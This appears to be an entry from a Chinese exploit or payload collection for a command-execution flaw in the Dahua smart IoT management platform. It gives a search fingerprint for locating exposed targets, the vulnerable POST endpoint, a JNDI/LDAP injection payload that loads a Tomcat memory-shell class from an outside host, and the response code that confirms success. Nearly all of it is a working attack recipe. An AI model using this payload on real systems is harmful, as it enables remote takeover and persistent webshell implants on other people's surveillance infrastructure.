# 大华智能物联综合管理平台is-exist命令执行漏洞

大华 ｜ 命令执行 ｜ —
- **指纹**：`body="*客户端会小于800*"`
- **请求**：`POST /evo-apigw/evo-brm/1.2.0/user/is-exist HTTP/1.1`

**Payload**
```
{"loginName":"${jndi:ldap://www.baidu.com/Basic/TomcatMemshell3}"}
```
- **响应特征**：406